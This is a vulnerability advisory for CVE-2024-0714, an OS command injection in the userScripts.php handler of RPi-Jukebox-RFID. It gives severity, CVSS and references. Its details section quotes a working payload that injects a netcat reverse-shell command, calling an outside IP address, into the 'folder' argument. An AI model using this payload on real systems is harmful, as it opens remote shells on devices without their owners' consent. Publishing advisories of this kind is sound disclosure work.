# [M] MiczFlor RPi-Jukebox-RFID HTTP Request userScripts.php os command injection

## Summary
Severity: Medium
Advisory: CVE-2024-0714
CVSS: 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)
Published: 2024-01-19
Source: https://osv.dev/vulnerability/CVE-2024-0714
Type: osv

## Details
A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.

## References
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2024/0xxx/CVE-2024-0714.json
- https://nvd.nist.gov/vuln/detail/CVE-2024-0714
- https://vuldb.com/?id.251540
- https://vuldb.com/?ctiid.251540
